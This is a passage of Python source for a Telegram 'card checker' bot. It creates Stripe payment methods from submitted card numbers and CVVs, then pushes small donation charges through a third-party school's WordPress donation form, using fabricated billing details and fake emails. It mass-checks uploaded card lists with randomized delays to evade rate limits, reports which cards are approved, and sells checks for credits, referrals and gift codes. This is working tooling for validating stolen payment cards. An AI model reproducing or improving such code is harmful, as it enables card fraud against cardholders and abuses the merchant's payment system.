            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        data = f'type=card&billing_details[name]=Waiyan&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Ff4aa9d6f0f%3B+stripe-js-v3%2Ff4aa9d6f0f%3B+card-element&key={PK}'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=10)
        
        if response.status_code != 200:
            return f"Stripe Error {response.status_code}"
        
        pm_data = response.json()
        if 'error' in pm_data:
            return f"Stripe: {pm_data['error'].get('message', 'Error')}"
        
        pmid = pm_data.get('id')
        if not pmid:
            return "No payment method ID"
        
        # Get billing address
        billing_address = get_billing_address(n[:6])
        
        headers = {
            'authority': 'texassouthernacademy.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://texassouthernacademy.com',
            'referer': 'https://texassouthernacademy.com/donation/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'action': 'wp_full_stripe_inline_donation_charge',
            'wpfs-form-name': 'donate',
            'wpfs-form-get-parameters': '%7B%7D',
            'wpfs-custom-amount': 'other',
            'wpfs-custom-amount-unique': '0.50',
            'wpfs-donation-frequency': 'one-time',
            'wpfs-billing-name': billing_address['name'],
            'wpfs-billing-address-country': billing_address['country'],
            'wpfs-billing-address-line-1': billing_address.get('address_line_1', '7246 Royal Ln'),
            'wpfs-billing-address-line-2': '',
            'wpfs-billing-address-city': billing_address['city'],
            'wpfs-billing-address-state': '',
            'wpfs-billing-address-state-select': billing_address['state'],
            'wpfs-billing-address-zip': billing_address['postal_code'],
            'wpfs-card-holder-email': f'{billing_address["name"].replace(" ", "")}{random_amount1}{random_amount2}@gmail.com',
            'wpfs-card-holder-name': billing_address['name'],
            'wpfs-stripe-payment-method-id': f'{pmid}',
        }
        
        response = requests.post('https://texassouthernacademy.com/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=10)
        
        if response.status_code != 200:
            return f"AJAX Error {response.status_code}"
        
        result_data = response.json()
        return result_data.get('message', 'Declined')
        
    except Exception as e:
        return f"Error: {str(e)[:50]}"

async def mass_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle mass check callback"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    await query.edit_message_text(
        "*📊 MASS CHECK SYSTEM*\n"
        "══════════════════════\n"
        "To Start A Mass Check:\n"
        "1. Upload a .txt File With Cards\n"
        "2. Use `/mchk` Command\n\n"
        "*Format In File:*\n"
        "`cc|mm|yy|cvv`\n"
        "`cc|mm|yy|cvv`\n"
        "...\n\n"
        "*Features:*\n"
        "• Approved Cards Are Shown\n"
        "• Declined Cards Are Not Shown\n"
        "• Cancel Anytime With /cancel\n"
        "• Credits Deducted Per Card\n\n",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]])
    )

def log_charged_only(message_text, chat_id=None, username=None):
    """Log charged cards to LOG_CHANNEL (simplified version)"""
    try:
        # Check if it's a charged message
        if "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" in message_text or "✅ Charged" in message_text:
            # In your actual implementation, you would send to a channel
            # For now, just log it
            logger.info(f"CHARGED CARD detected from user @{username or 'unknown'}")
            # You can add code here to send to your LOG_CHANNEL
            # bot.send_message(LOG_CHANNEL, message_text, parse_mode="HTML")
    except Exception as e:
        logger.error(f"Error in log_charged_only: {e}")

def format_card_result(card, status, message, credits_left=None, user_stats=None):
    """Wrapper for backward compatibility - uses universal format"""
    try:
        cc, mon, year, cvv = card.split("|")
        
        # Calculate time taken based on status
        time_taken = random.uniform(1.5, 2.5) if status == "approved" else random.uniform(0.8, 1.8)
        
        return format_universal_result(
            card_data=card,
            status=status,
            message=message,
            credits_left=credits_left,
            username=None,  # Can be added if needed
            time_taken=time_taken
        )
    except Exception as e:
        return f"❌ <b>Error:</b> <code>{str(e)[:50]}</code>"

# ==================== COMMAND HANDLERS ====================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command with referral system"""
    if update.message:
        message = update.message
        user_id = update.effective_user.id
        user_name = update.effective_user.first_name or ""
        username = update.effective_user.username or ""
    elif update.callback_query:
        message = update.callback_query.message
        user_id = update.callback_query.from_user.id
        user_name = update.callback_query.from_user.first_name or ""
        username = update.callback_query.from_user.username or ""
    else:
        return
    
    # Check for referral parameter
    referrer_id = None
    if context.args and context.args[0].startswith('ref_'):
        try:
            referrer_id = int(context.args[0].replace('ref_', ''))
        except ValueError:
            referrer_id = None
    
    user = await get_user(user_id)
    
    # Update user info if needed
    updates = {}
    if user.get('username', '') != username:
        updates['username'] = username
    if user.get('first_name', '') != user_name:
        updates['first_name'] = user_name
    
    # Handle referral if it's a new user with referrer
    if referrer_id and referrer_id != user_id and not user.get('referrer_id'):
        updates['referrer_id'] = referrer_id
        updates['credits'] = user.get('credits', 0) + 20  # New user gets 20 credits
        
        # Update referrer's credits in Firebase
        try:
            referrer_ref = db.collection('users').document(str(referrer_id))
            referrer_ref.update({
                "credits": firestore.Increment(100),
                "referrals_count": firestore.Increment(1),
                "earned_from_referrals": firestore.Increment(100)
            })
        except Exception as e:
            logger.error(f"Error updating referrer: {e}")
    
    if updates:
        await update_user(user_id, updates)
        user = await get_user(user_id)  # Refresh user data
    
    # Check channel membership
    if not user.get('joined_channel', False):
        keyboard = [
            [InlineKeyboardButton("✅ Join Private Channel", url=CHANNEL_LINK)],
            [InlineKeyboardButton("🔄 Verify Join", callback_data="verify_join")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Use HTML parsing to avoid markdown issues
        welcome_text = f"""<b>🔒 CHANNEL JOIN REQUIRED</b>
══════════════════════
To Access {BOT_INFO['name']}, You Must Join Our Channel.

<b>Steps:</b>
1. Click 'Join Channel'
2. After Joining Click 'Verify Join'
"""
        
        await message.reply_text(
            welcome_text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
        return
    
    # User has joined channel
    await update_user(user_id, {'joined_channel': True})
    
    # Check if user is admin
    is_admin = user_id in ADMIN_IDS
    
    # Check if user came from referral
    referral_bonus_text = ""
    if user.get('referrer_id'):
        referral_bonus_text = f"🎁 <b>Referral Bonus:</b> +20 credits (from invitation)\n"
    
    # Prepare welcome message using HTML
    user_credits = user.get('credits', 0)
    approved_cards = user.get('approved_cards', 0)
    declined_cards = user.get('declined_cards', 0)
    total_checks = user.get('total_checks', 0)
    
    welcome_text = f"""<b>{BOT_INFO['name']}</b>
══════════════════════
👋 <b>Welcome, {escape_markdown_v2(user_name) or 'User'}!</b>

<b>Account Overview:</b>
• Credits: <b>{user_credits}</b>
• Today Checks: Approved {approved_cards} Declined {declined_cards}
• Total Checks: <b>{total_checks}</b>
{referral_bonus_text}
<b>User Commands:</b>
• <code>/chk cc|mm|yy|cvv</code> - Check Single Card
• <code>/mchk</code> - Upload File For Mass Check
• <code>/credits</code> - Check Credits
• <code>/claim CODE</code> - Redeem Gift Code
• <code>/info</code> - Bot Information
• <code>/invite</code> - Invite Friends & Earn Credits
• <code>/cancel</code> - Cancel Mass Check
• <code>/help</code> - See All Commands
"""
    
    # Add admin commands if user is admin
    if is_admin:
        welcome_text += """
<b>Admin Commands:</b>
• <code>/addcr user_id amount</code> - Add Credits
• <code>/gengift credits max_uses</code> - Create Gift Code
• <code>/listgifts</code> - List All Gift Codes
• <code>/userinfo user_id</code> - View User Info
• <code>/botinfo</code> - Bot Statistics
"""
    
    welcome_text += """
<b>Owner:</b> 👑 @ISHANT_OFFICIAL
══════════════════════
""" 
    await message.reply_text(
        welcome_text,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /info command - Shows public bot info"""
    user_id = update.effective_user.id
    
    # Get user stats for display
    user = await get_user(user_id)
    is_admin = user_id in ADMIN_IDS
    
    # Prepare info message using HTML
    info_text = f"""<b>{BOT_INFO['name']}</b>
══════════════════════
<b>Version:</b> {BOT_INFO['version']}
<b>Creator:</b> @ISHANT_OFFICIAL
<b>Gates:</b> {BOT_INFO['gates']}

<b>Features:</b>
{BOT_INFO['features']}

<b>Your Stats:</b>
• Credits: <b>{user.get('credits', 0)}</b>
• Total Checks: <b>{user.get('total_checks', 0)}</b>

<b>User Commands:</b>
• <code>/chk cc|mm|yy|cvv</code> - Check Single Card
• <code>/mchk</code> - Upload File For Mass Check
• <code>/credits</code> - Check Credits
• <code>/claim CODE</code> - Redeem Gift Code
• <code>/info</code> - Bot Information
• <code>/invite</code> - Invite Friends & Earn Credits
• <code>/cancel</code> - Cancel Mass Check
• <code>/help</code> - See All Commands
"""
    
    # Add admin commands if user is admin
    if is_admin:
        info_text += """
<b>Admin Commands:</b>
• <code>/addcr user_id amount</code> - Add Credits
• <code>/gengift credits max_uses</code> - Create Gift Code
• <code>/listgifts</code> - List All Gift Codes
• <code>/userinfo user_id</code> - View User Info
• <code>/botinfo</code> - Bot Statistics
"""
    
    info_text += """
<b>Owner:</b> 👑 @ISHANT_OFFICIAL
══════════════════════
"""
    
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_start")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        info_text,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /credits command"""
    if update.message:
        user_id = update.effective_user.id
        message = update.message
    else:
        return
    
    user = await get_user(user_id)
    
    if not user['joined_channel']:
        await message.reply_text(
            "❌ Please join our private channel first using /start",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Get referral stats
    referrals_count = user.get('referrals_count', 0)
    earned_from_referrals = user.get('earned_from_referrals', 0)
    
    keyboard = [
        [InlineKeyboardButton("🎁 Claim Gift Code", callback_data="claim_gift"),
         InlineKeyboardButton("🤝 Invite & Earn", callback_data="invite")],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await message.reply_text(
        f"*💰 YOUR CREDITS*\n"
        f"══════════════════════\n"
        f"*Available Credits:* {user['credits']}\n"
        f"*Credits Spent:* {user.get('credits_spent', 0)}\n"
        f"*Referrals:* {referrals_count} users (+{earned_from_referrals} credits earned)\n\n"
        f"*Get More Credits:*\n"
        f"1. Invite friends: +100 Credits Each\n"
        f"2. Claim Gift Codes\n"
        f"3. Ask Admin For Credits\n",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def invite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /invite command"""
    if update.message:
        user_id = update.effective_user.id
        message = update.message
    else:
        return
    
    user = await get_user(user_id)
    
    if not user['joined_channel']:
        await message.reply_text(
            "❌ Please join our private channel first using /start",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Generate invite link
    bot_username = (await context.bot.get_me()).username
    invite_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
    
    keyboard = [
        [InlineKeyboardButton("📋 Copy Link", callback_data="copy_invite")],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await message.reply_text(
        f"*🤝 INVITE & EARN*\n"
        f"══════════════════════\n"
        f"*Your Invite Link:*\n"
        f"`{invite_link}`\n\n"
        f"*How It Works:*\n"
        f"1. Share Your Invite Link With Friends\n"
        f"2. When They Join Using Your Link:\n"
        f"   • You Get 100 Credits\n"
        f"   • They Get 20 Credits\n"
        f"3. Earn Unlimited Credits!\n\n"
        f"*Your Stats:*\n"
        f"• Referrals: {user.get('referrals_count', 0)} Users\n"
        f"• Earned From Referrals: {user.get('earned_from_referrals', 0)} Credits\n\n"
        f"*Copy And Share Your Link Now!*",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /chk command for single card check"""
    user_id = update.effective_user.id
    user = await get_user(user_id)
    username = update.effective_user.username or "NoUsername"
    
    if not user.get('joined_channel', False):
        await update.message.reply_text(
            "<b>❌ ACCESS DENIED</b>\n"
            "Please join our private channel first using /start",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check command format
    if not context.args:
        await update.message.reply_text(
            "<b>❌ INVALID FORMAT</b>\n"
            "══════════════════════\n"
            "<b>Usage:</b> <code>/chk cc|mm|yy|cvv</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/chk 4111111111111111|12|2025|123</code>\n\n"
            "<b>Cost:</b> 1 credit per check\n"
            "<b>Speed:</b> ⚡ Instant",
            parse_mode=ParseMode.HTML
        )
        return
    
    card_input = " ".join(context.args)
    
    # Validate card format
    parts = card_input.split("|")
    if len(parts) != 4:
        await update.message.reply_text(
            "<b>❌ INVALID CARD FORMAT</b>\n"
            "Use: <code>cc|mm|yy|cvv</code>\n"
            "Example: <code>4111111111111111|12|25|123</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if user has credits
    if user.get("credits", 0) <= 0:
        await update.message.reply_text(
            "<b>💰 INSUFFICIENT CREDITS</b>\n"
            "══════════════════════\n"
            "You Don't Have Enough Credits To Check Cards.\n\n"
            "<b>Options:</b>\n"
            "• Invite Friends\n"
            "• Claim A Gift Code\n"
            "• Contact Admin For Credits\n\n"
            f"<b>Your Balance:</b> {user['credits']}",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Send processing message
    processing_msg = await update.message.reply_text(
        "<b>⚡ PROCESSING CARD...</b>\n",
        parse_mode=ParseMode.HTML
    )
    
    # Start timer for speed measurement
    start_time = time.time()
    
    # Check the card using the working function
    result_card, status, message_text, http_code = await check_single_card_fast(card_input)
    
    # Calculate actual processing time
    actual_time = time.time() - start_time
    
    # Always deduct credit for checks
    credit_deducted = True
    today_date = datetime.datetime.now().date().isoformat()
    
    updates = {
        'checks_today': user.get("checks_today", 0) + 1,
        'total_checks': user.get("total_checks", 0) + 1,
        'last_check_date': today_date,
        'credits': user.get("credits", 0) - 1,
        'credits_spent': user.get("credits_spent", 0) + 1
    }
    
    if status == "approved":
        updates['approved_cards'] = user.get("approved_cards", 0) + 1
        # Update bot statistics
        await update_bot_stats({
            'total_checks': 1,
            'total_credits_used': 1,
            'total_approved': 1
        })
    else:
        updates['declined_cards'] = user.get("declined_cards", 0) + 1
        # Update bot statistics
        await update_bot_stats({
            'total_checks': 1,
            'total_credits_used': 1,
            'total_declined': 1
        })
    
    await update_user(user_id, updates)
    
    # Refresh user data
    user = await get_user(user_id)
    
        # Format result using universal format
    result_text = format_universal_result(
        card_data=result_card,
        status=status,
        message=message_text,
        credits_left=user.get("credits", 0),
        username=username,
        time_taken=actual_time
    )
    
    # Log charged cards
    if status == "approved":
        log_charged_only(result_text, update.message.chat_id, username)
    
    # Update message with result
    await processing_msg.edit_text(result_text, parse_mode=ParseMode.HTML)

async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /mchk command for mass check"""
    user_id = update.effective_user.id
    user = await get_user(user_id)
    
    if not user['joined_channel']:
        await update.message.reply_text(
            "❌ Please join our private channel first using /start",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Check if user has uploaded a file
    if user_id not in files_storage:
        await update.message.reply_text(
            "*📊 MASS CHECK SYSTEM*\n"
            "══════════════════════\n"
            "To Start A Mass Check:\n"
            "1. Upload a .txt File With Cards\n"
            "2. Use `/mchk` Command\n\n"
            "*Format In File:*\n"
            "`cc|mm|yy|cvv`\n"
            "`cc|mm|yy|cvv`\n"
            "...\n\n"
            "*Features:*\n"
            "• Approved Cards Are Shown\n"
            "• Declined Cards Are Not Shown\n"
            "• Cancel Anytime With /cancel\n"
            "• Credits Deducted Per Card\n\n",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Get file info
    file_info = files_storage[user_id]
    
    # Download file
    try:
        file = await context.bot.get_file(file_info["file_id"])
        file_content = await file.download_as_bytearray()
        cards_text = file_content.decode('utf-8')
        cards = [line.strip() for line in cards_text.split('\n') if line.strip()]
    except Exception as e:
        await update.message.reply_text(f"❌ Error reading file: {str(e)[:50]}")
        return
    
    if len(cards) == 0:
        await update.message.reply_text("❌ No cards found in file.")
        return
    
    # Validate cards format
    valid_cards = []
    invalid_cards = []
    
    for card in cards:
        parts = card.split("|")
        if len(parts) == 4:
            valid_cards.append(card)
        else:
            invalid_cards.append(card)
    
    if len(valid_cards) == 0:
        await update.message.reply_text("❌ No valid cards found in file.")
        return
    
    # Check if user has enough credits
    if user["credits"] < len(valid_cards):
        await update.message.reply_text(
            f"*💰 INSUFFICIENT CREDITS*\n"
            f"══════════════════════\n"
            f"*Cards To Check:* {len(valid_cards)}\n"
            f"*Credits Needed:* {len(valid_cards)}\n"
            f"*Your Credits:* {user['credits']}\n\n"
            f"You Need {len(valid_cards) - user['credits']} More Credits.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Show confirmation
    await update.message.reply_text(
        f"*📊 MASS CHECK READY*\n"
        f"══════════════════════\n"
        f"*Valid Cards:* {len(valid_cards)}\n"
        f"*Invalid Cards:* {len(invalid_cards)}\n"
        f"*Your Credits:* {user['credits']}\n\n"
        f"To Start, Click The Button Below:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🚀 START CHECKING", callback_data=f"start_mass_{len(valid_cards)}")],
            [InlineKeyboardButton("❌ CANCEL", callback_data="cancel_mass")]
        ])
    )
    
    # Store valid cards
    files_storage[user_id]["cards"] = valid_cards
    files_storage[user_id]["invalid_cards"] = invalid_cards

async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context):
    """ULTRA-FAST mass checking with universal format"""
    processed = 0
    approved = 0
    declined = 0
    credits_used = 0  # Track actual credits used
    user = await get_user(user_id)
    username = None  # We'll get this from user data
    
    # Get username
    user_data = await get_user(user_id)
    username = user_data.get('username', 'NoUsername')
    
    # Calculate initial credits
    initial_credits = user.get("credits", 0)
    
    # Create session for reuse
    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=30)
    
    try:
        session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        
        # Process cards one by one
        for i, card in enumerate(cards):
            # Check if cancelled
            if user_id in checking_tasks and checking_tasks[user_id]["cancelled"]:
                break
            
            # Update status every 5 cards
            if i % 5 == 0 or i == len(cards) - 1:
                elapsed = time.time() - checking_tasks[user_id]["start_time"]
                progress = (processed / len(cards)) * 100
                
                try:
                    await status_msg.edit_text(
                        f"<b>🚀 MASS CHECK IN PROGRESS</b>\n"
                        f"══════════════════════\n"
                        f"<b>Total Cards:</b> {len(cards)}\n"
                        f"<b>Credits Used:</b> {credits_used}\n"
                        f"<b>Status:</b> {progress:.1f}%\n\n"
                        f"<b>Live Results:</b>\n"
                        f"══════════════════════\n"
                        f"✅ Approved: {approved}\n"
                        f"❌ Declined: {declined}\n"
                        f"⏳ Processed: {processed}/{len(cards)}",
                        parse_mode=ParseMode.HTML
                    )
                except Exception:
                    pass
            
            # Check single card
            start_time = time.time()
            result_card, status, message, http_code = await check_single_card_fast(card)
            actual_time = time.time() - start_time
            
            processed += 1
            
            # Update task data
            if user_id in checking_tasks:
                checking_tasks[user_id]["cards_processed"] = processed
            
            # Determine if it's an actual decline or error
            message_lower = str(message).lower() if message else ""
            is_actual_decline = any(keyword in message_lower for keyword in [
                'card', 'declined', 'insufficient', 'invalid', 'incorrect', 
                'expired', 'stolen', 'lost', 'fraud', 'limit', 'balance'
            ])
            
            is_error = any(keyword in message_lower for keyword in [
                'setup error', 'timeout', 'http error', 'network error', 
                'connection error', 'server error', 'internal error'
            ])
            
            if status == "approved":
                approved += 1
                credits_used += 1
                if user_id in checking_tasks:
                    checking_tasks[user_id]["approved"] = approved
                
                # Send approved result using universal format
                try:
                    # Get current user credits
                    current_user = await get_user(user_id)
                    current_credits = current_user.get("credits", 0) - credits_used
                    
                    result_text = format_universal_result(
                        card_data=result_card,
                        status=status,
                        message=message,
                        credits_left=current_credits,
                        username=username,
                        time_taken=actual_time
                    )
                    
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text=result_text,
                        parse_mode=ParseMode.HTML
                    )
                    
                    # Log charged cards
                    log_charged_only(result_text, chat_id, username)
                    
                except Exception as e:
                    logger.error(f"Error sending approved result: {e}")
                    
            elif status == "declined" and is_actual_decline and not is_error:
                declined += 1
                credits_used += 1
                if user_id in checking_tasks:
                    checking_tasks[user_id]["declined"] = declined
            else:
                # This was an error - don't count as decline for credit deduction
                declined += 1
                if user_id in checking_tasks:
                    checking_tasks[user_id]["declined"] = declined
            
            # Small delay to avoid rate limiting
            if i < len(cards) - 1:
                delay = random.uniform(0.5, 1.5)
                await asyncio.sleep(delay)
        
        # Close session
        await session.close()
        
    except Exception as e:
        logger.error(f"Error in mass check: {e}")
    
    # Final update after all cards processed
    elapsed = time.time() - checking_tasks[user_id]["start_time"]
    success_rate = (approved / len(cards) * 100) if cards else 0
    
    # Update user data with actual credits used
    updates = {
        'credits': initial_credits - credits_used,
        'credits_spent': user.get("credits_spent", 0) + credits_used,
        'checks_today': user.get("checks_today", 0) + processed,
        'total_checks': user.get("total_checks", 0) + processed,
        'approved_cards': user.get("approved_cards", 0) + approved,
        'declined_cards': user.get("declined_cards", 0) + declined,
        'last_check_date': datetime.datetime.now().date().isoformat()
    }
    await update_user(user_id, updates)
    
    # Update bot statistics with actual credits used
    await update_bot_stats({
        'total_checks': processed,
        'total_credits_used': credits_used,
        'total_approved': approved,
        'total_declined': declined
    })
    
    # Refresh user data
    user = await get_user(user_id)
    
    # Send summary with universal format style
    summary_text = f"""
━━━━━━━━━━━━━━━━━━━━
🎯 <b>MASS CHECK COMPLETE</b>
━━━━━━━━━━━━━━━━━━━━

📊 <b>STATISTICS</b>
• Total Cards: {len(cards)}
• ✅ Approved: {approved}
• ❌ Declined: {declined}
• Credits Used: {credits_used}
• Time Taken: {elapsed:.1f}s
• Success Rate: {success_rate:.1f}%

💳 <b>YOUR BALANCE</b>
<code>{user.get('credits', 0)} credits</code>

━━━━━━━━━━━━━━━━━━━━
🤖 <b>DARKXCODE CHECKER</b>
"""
    
    try:
        await status_msg.edit_text(summary_text, parse_mode=ParseMode.HTML)
    except Exception:
        pass
    
    # Cleanup
    if user_id in checking_tasks:
        del checking_tasks[user_id]

async def claim_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /claim command for gift codes"""
    user_id = update.effective_user.id
    user = await get_user(user_id)
    
    if not user['joined_channel']:
        await update.message.reply_text(
            "❌ Please join our private channel first using /start",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if not context.args:
        await update.message.reply_text(
            "*❌ Usage:* `/claim CODE`\n\n"
            "*Example:* `/claim ABC123XYZ456DEF7`\n\n"
            "Ask admin for gift codes or wait for announcements.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    code = context.args[0].upper().strip()
    
    # Check if code exists
    gift_code = await get_gift_code(code)
    if not gift_code:
        await update.message.reply_text(
            f"*❌ INVALID GIFT CODE*\n\n"
            f"Code `{code}` not found or expired.\n"
            f"Make sure you entered it correctly.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Check if user already claimed this code (Firebase version)
    db = get_db()
    if db:
        try:
            claimed_ref = db.collection('user_claimed_codes').document(f"{user_id}_{code}")
            claimed_doc = claimed_ref.get()
            
            if claimed_doc.exists:
                await update.message.reply_text(
                    f"*❌ ALREADY CLAIMED*\n\n"
                    f"You have already claimed gift code `{code}`.\n"
                    f"Each user can claim a code only once.",
                    parse_mode=ParseMode.MARKDOWN
                )
                return
        except Exception as e:
            logger.error(f"Firebase error checking claimed codes: {e}")
    else:
        # In-memory check
        if user_id in in_memory_claimed_codes and code in in_memory_claimed_codes[user_id]:
            await update.message.reply_text(
                f"*❌ ALREADY CLAIMED*\n\n"
                f"You have already claimed gift code `{code}`.\n"
                f"Each user can claim a code only once.",
                parse_mode=ParseMode.MARKDOWN
            )
            return
    
    # Check max uses
    if gift_code['max_uses'] and gift_code['uses'] >= gift_code['max_uses']:
        await update.message.reply_text(
            f"*❌ CODE LIMIT REACHED*\n\n"
            f"Code `{code}` has been claimed too many times.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Add credits to user
    credits_to_add = gift_code['credits']
    await update_user(user_id, {'credits': user['credits'] + credits_to_add})
    
    # Update gift code usage
    await update_gift_code_usage(code, user_id)
    
    # Refresh user data
    user = await get_user(user_id)
    
    await update.message.reply_text(
        f"*🎉 GIFT CODE CLAIMED!*\n"
        f"══════════════════════\n"
        f"*Code:* `{code}`\n"
        f"*Credits added:* {credits_to_add}\n"
        f"*New balance:* {user['credits']} credits\n\n"
        f"Thank you for using {BOT_INFO['name']}!",
        parse_mode=ParseMode.MARKDOWN
    )

# ==================== ADMIN COMMANDS ====================

async def addcr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: Add credits to user"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text(
            "*❌ Usage:* `/addcr user_id amount`\n"
            "*Example:* `/addcr 123456789 100`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    try:
        target_user_id = int(context.args[0])
        amount = int(context.args[1])
        
        if amount <= 0:
            await update.message.reply_text("❌ Amount must be positive.")
            return
        
        user = await get_user(target_user_id)
        await update_user(target_user_id, {'credits': user['credits'] + amount})
        user = await get_user(target_user_id)  # Refresh
        
        await update.message.reply_text(
            f"*✅ CREDITS ADDED*\n"
            f"══════════════════════\n"
            f"*User:* `{target_user_id}`\n"
            f"*Added:* {amount} credits\n"
            f"*New Balance:* {user['credits']} credits",
            parse_mode=ParseMode.MARKDOWN
        )
        
        # Notify user
        try:
            await context.bot.send_message(
                chat_id=target_user_id,
                text=f"*🎉 CREDITS ADDED*\n\n"
                     f"You received *{amount} credits* from admin!\n"
                     f"New balance: *{user['credits']} credits*",
                parse_mode=ParseMode.MARKDOWN
            )
        except:
            pass  # User might have blocked bot
            
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID or amount.")

async def gengift_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: Generate gift code"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text(
            "*❌ Usage:* `/gengift credits max_uses`\n"
            "*Example:* `/gengift 50 10`\n"
            "Creates a code worth 50 credits, usable 10 times.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    try:
        credits = int(context.args[0])
        max_uses = int(context.args[1])
        
        if credits <= 0 or max_uses <= 0:
            await update.message.reply_text("❌ Credits and max uses must be positive.")
            return
        
        # Generate unique code
        code = generate_gift_code()
        gift_code = await get_gift_code(code)
        while gift_code:
            code = generate_gift_code()
            gift_code = await get_gift_code(code)
        
        # Create gift code
        await create_gift_code(code, credits, max_uses, user_id)
        
        await update.message.reply_text(
            f"*🎁 GIFT CODE GENERATED*\n"
            f"══════════════════════\n"
            f"*Code:* `{code}`\n"
            f"*Credits:* {credits}\n"
            f"*Max Uses:* {max_uses}\n"
            f"*Created:* {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
            f"Share with users:\n"
            f"`/claim {code}`",
            parse_mode=ParseMode.MARKDOWN
        )
        
    except ValueError:
        await update.message.reply_text("❌ Invalid credits or max uses.")

async def listgifts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: List all gift codes"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    gift_codes_list = await get_all_gift_codes()
    
    if not gift_codes_list:
        await update.message.reply_text("📭 No gift codes generated yet.")
        return
    
    response = "*🎁 ACTIVE GIFT CODES*\n══════════════════════\n"
    
    for gift in gift_codes_list[:20]:
        uses_left = gift.get('max_uses', 0) - gift.get('uses', 0) if gift.get('max_uses') else 'Unlimited'
        uses = gift.get('uses', 0)
        credits = gift.get('credits', 0)
        code = gift.get('code', 'Unknown')
        response += f"• `{code}` - {credits} credits ({uses}/{uses_left} used)\n"
    
    if len(gift_codes_list) > 20:
        response += f"\n... and {len(gift_codes_list) - 20} more codes"
    
    await update.message.reply_text(response, parse_mode=ParseMode.MARKDOWN)

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /cancel command - Cancel ongoing mass check"""
    user_id = update.effective_user.id
    
    if user_id not in checking_tasks:
        await update.message.reply_text(
            "*ℹ️ NO ACTIVE CHECK*\n"
